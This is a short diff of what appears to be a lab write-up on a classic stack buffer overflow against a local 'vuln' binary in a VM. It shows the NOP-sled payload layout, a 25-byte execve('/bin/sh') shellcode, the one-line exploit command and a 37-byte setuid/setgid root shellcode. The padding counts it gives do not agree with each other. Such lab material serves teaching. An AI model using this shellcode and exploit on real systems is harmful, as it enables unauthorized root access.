@@ -66,7 +66,8 @@ This is a part to play around & 47 As might be overestimate...And return address
  
  Final payload structure: [40 bytes of NOP - sled] [25 bytes of shellcode] [47 times ‘A’ will occupy 49 bytes] [4 bytes pointing in the middle of the NOP - sled: 0xbfffea20]
 
-Prepared 25 byte long shell code which tells VM to launch a shell: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+# Exploiting test:
+25 byte long shell code (in Assembly) which tells VM to launch a shell: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
 
 ```python
 ./vuln $(python -c 'print "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*37 + "\x20\xea\xff\xbf"')
@@ -75,8 +76,8 @@ Prepared 25 byte long shell code which tells VM to launch a shell: \x31\xc0\x50\
 
 Note that above part have code execution but not root shell access. It happens due to the protection in /bin/bash. We remove the restriction by:
 setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL])
-Thus, we have 37 byte shell code to gain root access:
 
+Thus, we have 37 byte shell code to gain root access:
 \x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80
 
 ```python
